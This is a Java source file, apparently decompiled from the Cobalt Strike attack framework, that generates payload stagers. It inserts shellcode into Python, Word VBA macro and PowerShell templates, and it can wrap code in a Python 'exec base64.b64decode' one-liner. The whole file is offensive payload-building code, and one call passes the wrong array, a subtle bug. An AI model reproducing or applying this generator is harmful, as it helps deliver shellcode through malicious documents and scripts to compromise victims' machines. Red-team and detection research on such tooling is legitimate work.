package common;

import aggressor.AggressorClient;
import common.CommonUtils;
import common.MudgeSanity;
import encoders.Base64;
import encoders.Transforms;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Stack;

import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

public abstract class BaseResourceUtils {

    protected AggressorClient client;

    public BaseResourceUtils(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public byte[] getScriptedResource(String string, byte[] arrby1, byte[] arrby2) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby2));
        stack.push(SleepUtils.getScalar(arrby1));
        stack.push(SleepUtils.getScalar(string));
        String str = this.client.getScriptEngine().format("RESOURCE_GENERATOR", stack);
        if (str == null) {
            return new byte[0];
        }
        return CommonUtils.toBytes(str);
        // return (str == null) ? new byte[0] : CommonUtils.toBytes(str);
    }

    public byte[] buildPython(byte[] arrby1, byte[] arrby2) {
        byte[] arrby = getScriptedResource("template.py", arrby1, arrby2);
        if (arrby.length == 0) {
            return BaseResourceUtils._buildPython(arrby, arrby2);
        }
        return arrby;
        // return (arrby.length == 0) ? _buildPython(arrby1, arrby2) : arrby;
    }

    public byte[] buildMacro(byte[] arrby) {
        byte[] arrby2 = getScriptedResource("template.x86.vba", arrby, new byte[0]);
        if (arrby2.length == 0) {
            return this._buildMacro(arrby);
        }
        return arrby2;
        // return (arrby2.length == 0) ? _buildMacro(arrby) : arrby;
    }

    public byte[] buildPowerShell(byte[] arrby, boolean bl) {
        byte[] arrby2 = new byte[0];
        if (bl) {
            arrby2 = getScriptedResource("template.x64.ps1", new byte[0], arrby);
        } else {
            arrby2 = getScriptedResource("template.x86.ps1", arrby, new byte[0]);
        }
        if (arrby2.length == 0) {
            return this._buildPowerShell(arrby, bl);
        }
        return arrby2;
        // return (arrby2.length == 0) ? _buildPowerShell(arrby, bl) : arrby2;
    }

    public byte[] buildPowerShell(byte[] arrby) {
        return buildPowerShell(arrby, false);
    }

    public void buildPowerShell(byte[] arrby, String string) {
        buildPowerShell(arrby, string, false);
    }

    public void buildPowerShell(byte[] arrby, String string, boolean bl) {
        byte[] arrby2 = buildPowerShell(arrby, bl);
        CommonUtils.writeToFile(new File(string), arrby2);
    }

    public abstract byte[] _buildPowerShell(byte[] arrby, boolean bl);

    public byte[] _buildMacro(byte[] arrby) {
        String str1 = CommonUtils.bString(CommonUtils.readResource("resources/template.x86.vba"));
        String str2 = "myArray = " + Transforms.toVBA(arrby);
        str1 = CommonUtils.strrep(str1, "$PAYLOAD$", str2);
        return CommonUtils.toBytes(str1);
    }

    public static byte[] _buildPython(byte[] arrby1, byte[] arrby2) {
        try {
            InputStream inputStream = CommonUtils.resource("resources/template.py");
            byte[] arrby = CommonUtils.readAll(inputStream);
            inputStream.close();
            String str = CommonUtils.bString(arrby);
            str = CommonUtils.strrep(str, "$$CODE32$$",
                    CommonUtils.bString(Transforms.toVeil(arrby1)));
            str = CommonUtils.strrep(str, "$$CODE64$$",
                    CommonUtils.bString(Transforms.toVeil(arrby2)));
            return CommonUtils.toBytes(str);
        } catch (IOException iOException) {
            MudgeSanity.logException("buildPython", iOException, false);
            return new byte[0];
        }
    }

    public String PythonCompress(byte[] arrby) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby));
        String str = this.client.getScriptEngine().format("PYTHON_COMPRESS", stack);
        return (str == null) ? ("import base64; exec base64.b64decode(\"" + Base64.encode(arrby) + "\")") : str;
    }
}
